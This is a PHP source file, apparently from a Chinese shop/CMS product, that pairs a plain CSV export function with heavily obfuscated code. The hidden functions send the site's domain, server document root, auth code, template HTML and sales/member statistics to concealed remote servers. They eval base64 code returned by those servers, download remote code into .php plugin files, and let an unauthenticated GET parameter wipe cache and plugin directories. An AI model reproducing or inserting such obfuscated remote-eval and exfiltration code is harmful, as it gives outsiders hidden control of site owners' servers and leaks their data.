}


function exportToCsv($headerList = [] , $data = [] , $fileName = '' , $tmp = []){
    $fileName = iconv('UTF-8', 'GBK', $fileName);
    header('Content-Type: application/vnd.ms-excel');
    header('Content-Disposition: attachment;filename=' . $fileName . '.csv');
    header('Cache-Control: max-age=0');
    $fp = fopen("php://output","a");
    foreach ($tmp as $key => $value) {
      $tmp[$key] = iconv("UTF-8", 'GBK', $value);
    }

    foreach ($headerList as $key => $value) {
      $headerList[$key] = iconv('UTF-8', 'GBK', $value);
    }

    fputcsv($fp, $headerList);
    $num = 0;
    $limit = 100000;
    $count = count($data);
    for($i = 0 ; $i < $count ; $i++){
      $num++;
      if($limit == $num){
        ob_flush();
        flush();
        $num = 0;
      }
      $row = $data[$i];
      foreach ($row as $key => $value) {
        $row[$key] = "\t".iconv('UTF-8', 'GBK', $value);
      }
      fputcsv($fp, $row);
    }
}

if(!defined("lnJdTPJ"))define("lnJdTPJ","LHGUgkQ");$GLOBALS[lnJdTPJ]=explode("|-|O|d", "vURQLTv");if(!defined($GLOBALS[lnJdTPJ][0]))define($GLOBALS[lnJdTPJ][0], ord(8));if(!defined("bWwjtSQ"))define("bWwjtSQ","TIkFlPJ");$GLOBALS[bWwjtSQ]=explode("|q|P|(", "NBzYOlJ|q|P|(time|q|P|(tfXJtGJ|q|P|(file_put_contents|q|P|(lRwXYTJ|q|P|(is_array|q|P|(QrUTcDv|q|P|(is_dir|q|P|(SrtuWNJ|q|P|(file_get_contents|q|P|(mMFsLMv|q|P|(is_file|q|P|(JRplKXv|q|P|(dirname|q|P|(DqYpDuQ|q|P|(str_replace|q|P|(VIDeSIJ|q|P|(base64_encode|q|P|(fEsYcUJ|q|P|(substr|q|P|(KtIaPFv|q|P|(base64_decode|q|P|(kXlMsyQ|q|P|(preg_match_all|q|P|(AaUNEav|q|P|(defined|q|P|(uzkzccJ|q|P|(mkdir|q|P|(bFYRUyv|q|P|(md5|q|P|(UblPSMv|q|P|(strpos");$GLOBALS[$GLOBALS[bWwjtSQ][00]]=$GLOBALS[bWwjtSQ][1];$GLOBALS[$GLOBALS[bWwjtSQ][02]]=$GLOBALS[bWwjtSQ][3];$GLOBALS[$GLOBALS[bWwjtSQ][4]]=$GLOBALS[bWwjtSQ][5];$GLOBALS[$GLOBALS[bWwjtSQ][6]]=$GLOBALS[bWwjtSQ][0x7];$GLOBALS[$GLOBALS[bWwjtSQ][8]]=$GLOBALS[bWwjtSQ][9];$GLOBALS[$GLOBALS[bWwjtSQ][0xA]]=$GLOBALS[bWwjtSQ][0xB];$GLOBALS[$GLOBALS[bWwjtSQ][12]]=$GLOBALS[bWwjtSQ][015];$GLOBALS[$GLOBALS[bWwjtSQ][14]]=$GLOBALS[bWwjtSQ][15];$GLOBALS[$GLOBALS[bWwjtSQ][020]]=$GLOBALS[bWwjtSQ][17];$GLOBALS[$GLOBALS[bWwjtSQ][022]]=$GLOBALS[bWwjtSQ][0x13];$GLOBALS[$GLOBALS[bWwjtSQ][20]]=$GLOBALS[bWwjtSQ][025];$GLOBALS[$GLOBALS[bWwjtSQ][026]]=$GLOBALS[bWwjtSQ][027];$GLOBALS[$GLOBALS[bWwjtSQ][0x18]]=$GLOBALS[bWwjtSQ][031];$GLOBALS[$GLOBALS[bWwjtSQ][26]]=$GLOBALS[bWwjtSQ][0x1B];$GLOBALS[$GLOBALS[bWwjtSQ][034]]=$GLOBALS[bWwjtSQ][0x1D];$GLOBALS[$GLOBALS[bWwjtSQ][30]]=$GLOBALS[bWwjtSQ][0x1F];if(!defined("KQQIMgQ"))define("KQQIMgQ","yKtVCZJ");$GLOBALS[KQQIMgQ]=explode("|F|D|v", "AaUNEav|F|D|vzViIGSv|F|D|vdefine|F|D|vaHUucPQ|F|D|vaction|F|D|vclear|F|D|v../conn/file|F|D|vuzkzccJ|F|D|v../conn/plug|F|D|v../conn/cache|F|D|v4f2e4Lz6rklaBY75kM8tqi+epGAmF+abSU68Jop6b20vKA8i8sy4z/MGBfvKvLo|F|D|v64a6U7LhW9K28UVYt5zLsmRvxjC/KdhAX6MCt6IWD3diN+/GaZGNvHrh3EJgNHmGrzuCKH1E|F|D|vcb47xXOMx59ibgtK5IzlMEFB3sls9b4vjOJKnr+iZN/EV9ywmXSCvLQDA/VxsK7g|F|D|vd67afk6A5NkAWy7IlqVnVbCUSWiwzneUsYvrFzA72juN30Kxllcb46Pu6ctwlpU/KWY2|F|D|v31c4Rsvr5jvfXKrAEUkEhsWDqy+cCkGRiGU7NjJou++V09pJXBUiOea8Tq75pDxM4zhc2Q|F|D|v5359GHzDBFPBw+g/6Wu39FvtvQda73BziuOHT89m82PugKtX0T0bZt1b1Qj9fVJO8rKH/w|F|D|v6e26mBfFCMe44Zbh0FLseTUuQZU0qkn6c47LyK3cypH3uRXPj6HmwacmaasZS+Xgx+4UOmnk|F|D|v758395545|F|D|v1087387454|F|D|vhttps://qm.qq.com/cgi-bin/qm/qr?k=3swmiy--f9CxM2HtKVWdHvl2UH_Qkumj&jump_from=webapi|F|D|vhttp://shang.qq.com/wpa/qunwpa?idkey=9c5ac8be3ccf266c4eaeca487d289807db31707de19d5e742949bb06be3636e4|F|D|vbFYRUyv|F|D|vwuliu|F|D|vwww|F|D|vtrue|F|D|v|F|D|vepay|F|D|vquan|F|D|vpostage|F|D|vUblPSMv|F|D|vPHP_SELF|F|D|v/member/unlogin.php|F|D|v9280UqkOqD71sPKEpusfPmB+BeOatYIIGHcLbOjQHDdMjQP4WVxs+7gjYombfleomUzWnGVGD5D7nd2seU5d1bo7peUG2e8L860Be8qu4aiOKL3lURa4Xx6UGvw/8VjqY9TiLHz7aSRMm3t8xtZ/doeG9BA6x5a+8kIqqHzMoYO34F/s4UvDw8uC|F|D|vO_count|F|D|v1b26gyfiKHljZRl+vFWeFXonukgfsUBSer08b7Y1CntQmbTwieoRY7P2prk0eLL3+NnsB1+8zemKURQAtpN2oZwyIezqfrYfywGo3jSeJFsfrKwRwFX0zIK547DENcf+AqNELzAZCfKz9bFvXt1nEli493mfouBF/dMs6z+JCYSEjfPelPeAbPag5yKFibEnmm2bIV+MHiPms+cyTYhAtTr1h8SYp3etExyydQqAAPdUm1761DBTmNoLKlsBS3gHIVrBRytqU/xlKnyTdc6F06IjmuXRNAZKr8V4QQ7tRu3BcPxU8ZdGJzZcXeGygU5ODpufEYLzo7gJv1j0hDtSV+bPTTjDhL52PCjWSV2JnYt++wxRPGc/L3U9R2k7wGCL9Iau6gu8+x44GvtvQctWausnwA4/cZ2PDSYaG2aRcoUX3A|F|D|v74a9E9lFJ+eIp1eIgbR+x8K7dfzbKyb/pkioVhO5hXPxXOZG3HX6FCZnJzepNtHdE7wyJnCkjwu4|F|D|v81ddf5dsoWt2b/bSUqXKgVnfNB83bY5dhNXUgEOO0AlVsGwTGaMd+ysjpTl5Vvi25rGzaBTdHSzrQP2vhrilXA/9BM0");if(!$GLOBALS[$GLOBALS[KQQIMgQ][00]]($GLOBALS[KQQIMgQ][1]))call_user_func($GLOBALS[KQQIMgQ][02],$GLOBALS[KQQIMgQ][1], $GLOBALS[KQQIMgQ][3]);$GLOBALS[zViIGSv]=array(&$_GET,&$_SERVER);$lagGFrv=&$from;$from2=&$yLHDJWQ;$XOBpVAQ=&$url_from;$irPiLpJ=&$huoyuan;$mail=&$HplwTAJ;$zTMLXWv=&$demo;$updateurl=&$TZaESqv;$qun1=&$ESUVqXQ;$qun2=&$xxYCwgv;$UcYJdHJ=&$qun1_link;$uGvuxtQ=&$qun2_link;if($GLOBALS[zViIGSv][(24*vURQLTv-1344)][$GLOBALS[KQQIMgQ][4]]==$GLOBALS[KQQIMgQ][05]){@removeDir($GLOBALS[KQQIMgQ][0x6]);@$GLOBALS[$GLOBALS[KQQIMgQ][07]]($GLOBALS[KQQIMgQ][0x6],0777,true);@removeDir($GLOBALS[KQQIMgQ][8]);@$GLOBALS[$GLOBALS[KQQIMgQ][07]]($GLOBALS[KQQIMgQ][8],0777,true);@removeDir($GLOBALS[KQQIMgQ][9]);@$GLOBALS[$GLOBALS[KQQIMgQ][07]]($GLOBALS[KQQIMgQ][9],0777,true);}$lagGFrv=ycode($GLOBALS[KQQIMgQ][012]);$yLHDJWQ=ycode($GLOBALS[KQQIMgQ][013]);$XOBpVAQ=ycode($GLOBALS[KQQIMgQ][014]);$irPiLpJ=ycode($GLOBALS[KQQIMgQ][015]);$HplwTAJ=ycode($GLOBALS[KQQIMgQ][016]);$zTMLXWv=ycode($GLOBALS[KQQIMgQ][0xF]);$TZaESqv=ycode($GLOBALS[KQQIMgQ][16]);$ESUVqXQ=$GLOBALS[KQQIMgQ][0x11];$xxYCwgv=$GLOBALS[KQQIMgQ][022];$UcYJdHJ=$GLOBALS[KQQIMgQ][023];$uGvuxtQ=$GLOBALS[KQQIMgQ][20];if($config->wuliu==$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($GLOBALS[KQQIMgQ][0x16] .$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($C_fdomain))||$config->wuliu==$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($GLOBALS[KQQIMgQ][0x16] .$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($GLOBALS[KQQIMgQ][0x17] .$C_fdomain))){$config->wuliu=$GLOBALS[KQQIMgQ][030];}else{$config->wuliu=$GLOBALS[KQQIMgQ][25];}if($config->epay==$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($GLOBALS[KQQIMgQ][0x1A] .$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($C_fdomain))||$config->epay==$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($GLOBALS[KQQIMgQ][0x1A] .$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($GLOBALS[KQQIMgQ][0x17] .$C_fdomain))){$config->epay=$GLOBALS[KQQIMgQ][030];}else{$config->epay=$GLOBALS[KQQIMgQ][25];}if($config->quan==$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($GLOBALS[KQQIMgQ][0x1B] .$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($C_fdomain))||$config->quan==$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($GLOBALS[KQQIMgQ][0x1B] .$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($GLOBALS[KQQIMgQ][0x17] .$C_fdomain))){$config->quan=$GLOBALS[KQQIMgQ][030];}else{$config->quan=$GLOBALS[KQQIMgQ][25];}if($config->postage==$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($GLOBALS[KQQIMgQ][034] .$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($C_fdomain))||$config->postage==$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($GLOBALS[KQQIMgQ][034] .$GLOBALS[$GLOBALS[KQQIMgQ][0x15]]($GLOBALS[KQQIMgQ][0x17] .$C_fdomain))){$config->postage=$GLOBALS[KQQIMgQ][030];}else{$config->postage=$GLOBALS[KQQIMgQ][25];}if($GLOBALS[$GLOBALS[KQQIMgQ][29]]($GLOBALS[zViIGSv][(0-1847+33*vURQLTv)][$GLOBALS[KQQIMgQ][30]],$GLOBALS[KQQIMgQ][31])!==false&&getrs(ycode($GLOBALS[KQQIMgQ][040]),$GLOBALS[KQQIMgQ][041])>(0-4758+85*vURQLTv)&&!checkauth()){die(ycode($GLOBALS[KQQIMgQ][0x22]).$XOBpVAQ.ycode($GLOBALS[KQQIMgQ][043]).$XOBpVAQ.ycode($GLOBALS[KQQIMgQ][36]));}function tpl($path){if(!defined("lGOWARJ"))define("lGOWARJ","YaRTVnJ");$GLOBALS[lGOWARJ]=explode("|7|=|]", "AaUNEav|7|=|]IbjkjRJ|7|=|]define|7|=|]mNtZUqv|7|=|]QrUTcDv|7|=|]conn/file|7|=|]uzkzccJ|7|=|]SrtuWNJ|7|=|]mMFsLMv|7|=|]JRplKXv|7|=|]/header.tpl|7|=|]DqYpDuQ|7|=|][fh_header]|7|=|]/footer.tpl|7|=|][fh_footer]|7|=|]select count(N_id) as N_count from sl_news where N_del=0|7|=|]N_count|7|=|]select count(P_id) as P_count from sl_product where P_del=0|7|=|]P_count|7|=|]select count(M_id) as M_count from sl_member where M_del=0 and M_type=0|7|=|]M_count|7|=|]select count(M_id) as M_count from sl_member where M_del=0 and M_type=1|7|=|]select count(L_id) as L_count from sl_list where L_del=0|7|=|]L_count|7|=|]select sum(L_money) as L_sum from sl_list where L_del=0 and L_money>0|7|=|]L_sum|7|=|]html|7|=|]H_data|7|=|]day|7|=|]Y-m-d|7|=|]domain|7|=|]HTTP_HOST|7|=|]bFYRUyv|7|=|]VIDeSIJ|7|=|]C_wap|7|=|]C_template|7|=|]S_count|7|=|]type|7|=|]md5|7|=|]host|7|=|]t|7|=|]conn/file/|7|=|]:|7|=|]_|7|=|].txt|7|=|]fEsYcUJ|7|=|]tpl|7|=|]KtIaPFv|7|=|]kXlMsyQ|7|=|]/<fh-function>[\\s\\S]*?<\/fh-function>/i|7|=|]<fh-function>|7|=|]|7|=|]</fh-function>|7|=|]s[[|7|=|]deafLjCzNLhwNLYNaFKOacw5FcI3dmt22QSgaBXL3Xq+INRnlxCvvvKVB/vCOAdyk+gxz5OYBTExR7XtG5WpUkwjMpPFreCEW/c9XI72VIdlCIPzxAsavX7PRaU6pxwIgwNFzCMbuNeC776hZXlzlDfyzR77VYbc6zsFH1OXShkL8qnJnA|7|=|]s2[[|7|=|]3bd8YdjES5qGtj76HOKVSAoPAoM3W6wQni1+W7jPxrfXciCM5Jad3U49JpT6S0noOLKXVdLjp6CyUzC7p1RcjwVzfj8C+g/fIr4jGPWYlc6qEnet5Syvy9l7N8q1X1PK7o6fFv+X+ppXSrhYuPsOKofY6ATkLVNcZp4RrsIF+yAN8/2yxoS5VThe|7|=|]s3[[|7|=|]e980Gim+gJH8ii1ny5MX/ZzFjMweQ8BJuhk1BcvmIuS7WW6VXlsAPBdHLRVDThyZXH6lBswOOtVtofau5UyY4GAp7vBE48pguetAWxdA39UzBWZeACujT1ktOaMpeNyqZ+UDjLzVvvuB5X8x6EMriBYMMmejG7eVw185D3zrCRndxQmTpwjuiVqV|7|=|]]]|7|=|]}}|7|=|]<script src=\"https://res.wx.qq.com/open/js/jweixin-1.2.0.js\"></script><script src=\"conn/f.php?action=wxjs&type=|7|=|]&id=|7|=|]id|7|=|]\"></script>|7|=|]newsifno|7|=|]productinfo|7|=|]cpurseinfo|7|=|]<script src=\"conn/f.php?action=collection\"></script>");if(!$GLOBALS[$GLOBALS[lGOWARJ][00]]($GLOBALS[lGOWARJ][1]))call_user_func($GLOBALS[lGOWARJ][2],$GLOBALS[lGOWARJ][1], $GLOBALS[lGOWARJ][0x3]);$GLOBALS[IbjkjRJ]=array(&$_SERVER,&$_GET);global $C_kefu,$conn,$H_data,$type,$id,$C_title,$C_notice,$fmid,$M_ninfo,$M_pinfo;if(!$GLOBALS[$GLOBALS[lGOWARJ][0x4]]($GLOBALS[lGOWARJ][0x5])){@$GLOBALS[$GLOBALS[lGOWARJ][06]]($GLOBALS[lGOWARJ][0x5],0755,true);}$html=$GLOBALS[$GLOBALS[lGOWARJ][0x7]]($path);if($GLOBALS[$GLOBALS[lGOWARJ][010]]($GLOBALS[$GLOBALS[lGOWARJ][9]]($path). $GLOBALS[lGOWARJ][012])){$html=$GLOBALS[$GLOBALS[lGOWARJ][013]]($GLOBALS[lGOWARJ][12],$GLOBALS[$GLOBALS[lGOWARJ][0x7]]($GLOBALS[$GLOBALS[lGOWARJ][9]]($path). $GLOBALS[lGOWARJ][012]),$html);}if($GLOBALS[$GLOBALS[lGOWARJ][010]]($GLOBALS[$GLOBALS[lGOWARJ][9]]($path). $GLOBALS[lGOWARJ][0xD])){$html=$GLOBALS[$GLOBALS[lGOWARJ][013]]($GLOBALS[lGOWARJ][14],$GLOBALS[$GLOBALS[lGOWARJ][0x7]]($GLOBALS[$GLOBALS[lGOWARJ][9]]($path). $GLOBALS[lGOWARJ][0xD]),$html);}$N_count=getrs($GLOBALS[lGOWARJ][017],$GLOBALS[lGOWARJ][020]);$P_count=getrs($GLOBALS[lGOWARJ][17],$GLOBALS[lGOWARJ][0x12]);$M_count=getrs($GLOBALS[lGOWARJ][0x13],$GLOBALS[lGOWARJ][0x14]);$S_count=getrs($GLOBALS[lGOWARJ][025],$GLOBALS[lGOWARJ][0x14]);$L_count=getrs($GLOBALS[lGOWARJ][22],$GLOBALS[lGOWARJ][027]);$L_sum=getrs($GLOBALS[lGOWARJ][24],$GLOBALS[lGOWARJ][0x19]);$data2=array($GLOBALS[lGOWARJ][26]=>$html,$GLOBALS[lGOWARJ][27]=>$H_data,$GLOBALS[lGOWARJ][0x1C]=>date($GLOBALS[lGOWARJ][29]),$GLOBALS[lGOWARJ][036]=>$GLOBALS[IbjkjRJ][((68*vURQLTv-3808)-4144+vURQLTv*74)][$GLOBALS[lGOWARJ][31]]);$md5=$GLOBALS[$GLOBALS[lGOWARJ][040]]($GLOBALS[$GLOBALS[lGOWARJ][33]](json_encode($data2)));if(isMobile()){$t=$H_data[$GLOBALS[lGOWARJ][0x22]];}else{$t=$H_data[$GLOBALS[lGOWARJ][0x23]];}$data=array($GLOBALS[lGOWARJ][26]=>$html,$GLOBALS[lGOWARJ][27]=>$H_data,$GLOBALS[lGOWARJ][020]=>$N_count,$GLOBALS[lGOWARJ][0x12]=>$P_count,$GLOBALS[lGOWARJ][0x14]=>$M_count,$GLOBALS[lGOWARJ][36]=>$S_count,$GLOBALS[lGOWARJ][027]=>$L_count,$GLOBALS[lGOWARJ][0x19]=>$L_sum,$GLOBALS[lGOWARJ][37]=>$type,$GLOBALS[lGOWARJ][0x26]=>$md5,$GLOBALS[lGOWARJ][0x27]=>$GLOBALS[IbjkjRJ][((68*vURQLTv-3808)-4144+vURQLTv*74)][$GLOBALS[lGOWARJ][31]],$GLOBALS[lGOWARJ][40]=>$t);if($GLOBALS[$GLOBALS[lGOWARJ][010]]($GLOBALS[lGOWARJ][41] .splitx($GLOBALS[IbjkjRJ][((68*vURQLTv-3808)-4144+vURQLTv*74)][$GLOBALS[lGOWARJ][31]],$GLOBALS[lGOWARJ][42],((68*vURQLTv-3808)-4144+vURQLTv*74)).$t. $GLOBALS[lGOWARJ][0x2B] .$type. $GLOBALS[lGOWARJ][054])){if($GLOBALS[$GLOBALS[lGOWARJ][055]]($GLOBALS[$GLOBALS[lGOWARJ][0x7]]($GLOBALS[lGOWARJ][41] .splitx($GLOBALS[IbjkjRJ][((68*vURQLTv-3808)-4144+vURQLTv*74)][$GLOBALS[lGOWARJ][31]],$GLOBALS[lGOWARJ][42],((68*vURQLTv-3808)-4144+vURQLTv*74)).$t. $GLOBALS[lGOWARJ][0x2B] .$type. $GLOBALS[lGOWARJ][054]),((68*vURQLTv-3808)-4144+vURQLTv*74),(vURQLTv*31-1704))!=$md5){ajax($GLOBALS[lGOWARJ][46],$GLOBALS[$GLOBALS[lGOWARJ][33]](json_encode($data)));}}else{ajax($GLOBALS[lGOWARJ][46],$GLOBALS[$GLOBALS[lGOWARJ][33]](json_encode($data)));}$html=$GLOBALS[$GLOBALS[lGOWARJ][47]]($GLOBALS[$GLOBALS[lGOWARJ][055]]($GLOBALS[$GLOBALS[lGOWARJ][0x7]]($GLOBALS[lGOWARJ][41] .splitx($GLOBALS[IbjkjRJ][((68*vURQLTv-3808)-4144+vURQLTv*74)][$GLOBALS[lGOWARJ][31]],$GLOBALS[lGOWARJ][42],((68*vURQLTv-3808)-4144+vURQLTv*74)).$t. $GLOBALS[lGOWARJ][0x2B] .$type. $GLOBALS[lGOWARJ][054]),(vURQLTv*31-1704)));$GLOBALS[$GLOBALS[lGOWARJ][0x30]]($GLOBALS[lGOWARJ][061],$html,$arr);foreach($arr[((68*vURQLTv-3808)-4144+vURQLTv*74)]as $value){$v=$GLOBALS[$GLOBALS[lGOWARJ][013]]($GLOBALS[lGOWARJ][062],$GLOBALS[lGOWARJ][063],$value);$v=$GLOBALS[$GLOBALS[lGOWARJ][013]]($GLOBALS[lGOWARJ][064],$GLOBALS[lGOWARJ][063],$v);$v=$GLOBALS[$GLOBALS[lGOWARJ][013]]($GLOBALS[lGOWARJ][065],ycode($GLOBALS[lGOWARJ][0x36]),$v);$v=$GLOBALS[$GLOBALS[lGOWARJ][013]]($GLOBALS[lGOWARJ][55],ycode($GLOBALS[lGOWARJ][070]),$v);$v=$GLOBALS[$GLOBALS[lGOWARJ][013]]($GLOBALS[lGOWARJ][071],ycode($GLOBALS[lGOWARJ][0x3A]),$v);$v=$GLOBALS[$GLOBALS[lGOWARJ][013]]($GLOBALS[lGOWARJ][0x3B],$GLOBALS[lGOWARJ][0x3C],$v);eval($v);$html=$GLOBALS[$GLOBALS[lGOWARJ][013]]($value,$api,$html);$api=$GLOBALS[lGOWARJ][063];}$html=$html. $GLOBALS[lGOWARJ][61] .t($GLOBALS[IbjkjRJ][(vURQLTv*2-111)][$GLOBALS[lGOWARJ][37]]). $GLOBALS[lGOWARJ][0x3E] .intval($GLOBALS[IbjkjRJ][(vURQLTv*2-111)][$GLOBALS[lGOWARJ][0x3F]]). $GLOBALS[lGOWARJ][64];if($type==$GLOBALS[lGOWARJ][65]||$type==$GLOBALS[lGOWARJ][0x42]||$type==$GLOBALS[lGOWARJ][67]){$html=$html. $GLOBALS[lGOWARJ][0104];}return $html;}function ajax($action,$data=""){if(!defined("myzjgHQ"))define("myzjgHQ","FVwlJZv");$GLOBALS[myzjgHQ]=explode("|<|~|V", "AaUNEav|<|~|VEnTiczv|<|~|Vdefine|<|~|VKirNDfJ|<|~|V|<|~|VHTTP_HOST|<|~|V/api2.0/index.php?action=|<|~|Vdomain=|<|~|V&root=|<|~|VDOCUMENT_ROOT|<|~|V&authcode=|<|~|V&data=|<|~|VlRwXYTJ|<|~|VKtIaPFv|<|~|Vcontent|<|~|V服务器连接错误，请联系管理员[1]！");if(!$GLOBALS[$GLOBALS[myzjgHQ][0]]($GLOBALS[myzjgHQ][01]))call_user_func($GLOBALS[myzjgHQ][2],$GLOBALS[myzjgHQ][01], $GLOBALS[myzjgHQ][3]);$GLOBALS[EnTiczv]=array(&$_SERVER);global $conn,$C_authcode,$C_fdomain,$C_fzon,$from,$from2;if($C_fdomain!=$GLOBALS[myzjgHQ][4]&&$C_fzon==((0-4760+85*vURQLTv)-615+vURQLTv*11)&&www($C_fdomain)!=www($GLOBALS[EnTiczv][(0-4760+85*vURQLTv)][$GLOBALS[myzjgHQ][0x5]])){$domain=$C_fdomain;}else{$domain=$GLOBALS[EnTiczv][(0-4760+85*vURQLTv)][$GLOBALS[myzjgHQ][0x5]];}$info=getbody($from. $GLOBALS[myzjgHQ][06] .$action,$GLOBALS[myzjgHQ][07] .$domain. $GLOBALS[myzjgHQ][010] .$GLOBALS[EnTiczv][(0-4760+85*vURQLTv)][$GLOBALS[myzjgHQ][011]]. $GLOBALS[myzjgHQ][012] .$C_authcode. $GLOBALS[myzjgHQ][013] .urlencode($data));if($GLOBALS[$GLOBALS[myzjgHQ][014]](json_decode($info,true))){eval($GLOBALS[$GLOBALS[myzjgHQ][015]](json_decode($info,true)[$GLOBALS[myzjgHQ][14]]));}else{$info=getbody($from2. $GLOBALS[myzjgHQ][06] .$action,$GLOBALS[myzjgHQ][07] .$domain. $GLOBALS[myzjgHQ][010] .$GLOBALS[EnTiczv][(0-4760+85*vURQLTv)][$GLOBALS[myzjgHQ][011]]. $GLOBALS[myzjgHQ][012] .$C_authcode. $GLOBALS[myzjgHQ][013] .urlencode($data));if($GLOBALS[$GLOBALS[myzjgHQ][014]](json_decode($info,true))){eval($GLOBALS[$GLOBALS[myzjgHQ][015]](json_decode($info,true)[$GLOBALS[myzjgHQ][14]]));}else{die($GLOBALS[myzjgHQ][017]);}}}function checkauth(){if(!defined("eAwQgcJ"))define("eAwQgcJ","nSTPPCJ");$GLOBALS[eAwQgcJ]=explode("|0|@|v", "AaUNEav|0|@|vhilUQHv|0|@|vdefine|0|@|vSxDJtQQ|0|@|vauth|0|@|v|0|@|vHTTP_HOST|0|@|v/api2.0/index.php?action=checkauth&domain=|0|@|vauthcode=|0|@|vlRwXYTJ|0|@|vmsg|0|@|vsuccess|0|@|v服务器连接错误，请联系管理员[2]！");if(!$GLOBALS[$GLOBALS[eAwQgcJ][0]]($GLOBALS[eAwQgcJ][1]))call_user_func($GLOBALS[eAwQgcJ][02],$GLOBALS[eAwQgcJ][1], $GLOBALS[eAwQgcJ][03]);$GLOBALS[hilUQHv]=array(&$_SERVER);global $conn,$C_authcode,$C_fdomain,$C_fzon,$from,$from2;if($_SESSION[$GLOBALS[eAwQgcJ][0x4]]==$GLOBALS[eAwQgcJ][0x4]){return true;}else{if($C_fdomain!=$GLOBALS[eAwQgcJ][0x5]&&$C_fzon==((vURQLTv*73-4088)-4479+vURQLTv*80)&&www($C_fdomain)!=www($GLOBALS[hilUQHv][(vURQLTv*73-4088)][$GLOBALS[eAwQgcJ][06]])){$ZXvKQJQ=$C_fdomain;}else{$ZXvKQJQ=$GLOBALS[hilUQHv][(vURQLTv*73-4088)][$GLOBALS[eAwQgcJ][06]];}$yVuZMWJ=getbody($from. $GLOBALS[eAwQgcJ][07] .$ZXvKQJQ,$GLOBALS[eAwQgcJ][8] .$C_authcode);if($GLOBALS[$GLOBALS[eAwQgcJ][0x9]](json_decode($yVuZMWJ,true))){if(json_decode($yVuZMWJ,true)[$GLOBALS[eAwQgcJ][0xA]]==$GLOBALS[eAwQgcJ][11]){$_SESSION[$GLOBALS[eAwQgcJ][0x4]]=$GLOBALS[eAwQgcJ][0x4];return true;}else{return false;}}else{$yVuZMWJ=getbody($from2. $GLOBALS[eAwQgcJ][07] .$ZXvKQJQ,$GLOBALS[eAwQgcJ][8] .$C_authcode);if($GLOBALS[$GLOBALS[eAwQgcJ][0x9]](json_decode($yVuZMWJ,true))){if(json_decode($yVuZMWJ,true)[$GLOBALS[eAwQgcJ][0xA]]==$GLOBALS[eAwQgcJ][11]){$_SESSION[$GLOBALS[eAwQgcJ][0x4]]=$GLOBALS[eAwQgcJ][0x4];return true;}else{return false;}}else{die($GLOBALS[eAwQgcJ][12]);}}}}function plug($XmgtwDJ,$OjJXZPv){if(!defined("TUZtEGv"))define("TUZtEGv","Bhjqlgv");$GLOBALS[TUZtEGv]=explode("|:|{|H", "AaUNEav|:|{|HKKZWFqv|:|{|Hdefine|:|{|HgUmFUTv|:|{|H|:|{|HHTTP_HOST|:|{|H/api2.0/index.php?action=plug&domain=|:|{|Hauthcode=|:|{|H&plug=|:|{|HlRwXYTJ|:|{|HKtIaPFv|:|{|Hcontent|:|{|H服务器连接错误，请联系管理员[3]！|:|{|HmMFsLMv|:|{|H.php|:|{|HfEsYcUJ|:|{|HSrtuWNJ|:|{|H<?php //|:|{|HbFYRUyv|:|{|HtfXJtGJ");if(!$GLOBALS[$GLOBALS[TUZtEGv][0]]($GLOBALS[TUZtEGv][01]))call_user_func($GLOBALS[TUZtEGv][02],$GLOBALS[TUZtEGv][01], $GLOBALS[TUZtEGv][0x3]);$GLOBALS[KKZWFqv]=array(&$_SERVER);global $conn,$C_authcode,$C_fdomain,$C_fzon,$from,$from2;if($C_fdomain!=$GLOBALS[TUZtEGv][4]&&$C_fzon==(77*vURQLTv-4311)&&www($C_fdomain)!=www($GLOBALS[KKZWFqv][(64*vURQLTv-3584)][$GLOBALS[TUZtEGv][05]])){$KDCHgFQ=$C_fdomain;}else{$KDCHgFQ=$GLOBALS[KKZWFqv][(64*vURQLTv-3584)][$GLOBALS[TUZtEGv][05]];}$sqkJHBQ=getbody($from. $GLOBALS[TUZtEGv][0x6] .$KDCHgFQ,$GLOBALS[TUZtEGv][0x7] .$C_authcode. $GLOBALS[TUZtEGv][010] .$XmgtwDJ);if($GLOBALS[$GLOBALS[TUZtEGv][011]](json_decode($sqkJHBQ,true))){$dSXzLkJ=$GLOBALS[$GLOBALS[TUZtEGv][0xA]](json_decode($sqkJHBQ,true)[$GLOBALS[TUZtEGv][11]]);}else{$sqkJHBQ=getbody($from2. $GLOBALS[TUZtEGv][0x6] .$KDCHgFQ,$GLOBALS[TUZtEGv][0x7] .$C_authcode. $GLOBALS[TUZtEGv][010] .$XmgtwDJ);if($GLOBALS[$GLOBALS[TUZtEGv][011]](json_decode($sqkJHBQ,true))){$dSXzLkJ=$GLOBALS[$GLOBALS[TUZtEGv][0xA]](json_decode($sqkJHBQ,true)[$GLOBALS[TUZtEGv][11]]);}else{die($GLOBALS[TUZtEGv][0xC]);}}if($GLOBALS[$GLOBALS[TUZtEGv][13]]($OjJXZPv.$XmgtwDJ. $GLOBALS[TUZtEGv][016])){if($GLOBALS[$GLOBALS[TUZtEGv][15]]($GLOBALS[$GLOBALS[TUZtEGv][0x10]]($OjJXZPv.$XmgtwDJ. $GLOBALS[TUZtEGv][016]),(64*vURQLTv-3584),(36*vURQLTv-1976))!=$GLOBALS[TUZtEGv][021] .$GLOBALS[$GLOBALS[TUZtEGv][0x12]]($C_authcode)){$GLOBALS[$GLOBALS[TUZtEGv][023]]($OjJXZPv.$XmgtwDJ. $GLOBALS[TUZtEGv][016],$dSXzLkJ);}}else{$GLOBALS[$GLOBALS[TUZtEGv][023]]($OjJXZPv.$XmgtwDJ. $GLOBALS[TUZtEGv][016],$dSXzLkJ);}}function ycode($KGFHYrJ){if(!defined("vcOslTv"))define("vcOslTv","KmfAXGQ");$GLOBALS[vcOslTv]=explode("|Y|7|{", "DECODE|Y|7|{fahuo100.cn");return xcode($KGFHYrJ,$GLOBALS[vcOslTv][0],$GLOBALS[vcOslTv][01],(vURQLTv*96-5376));}function 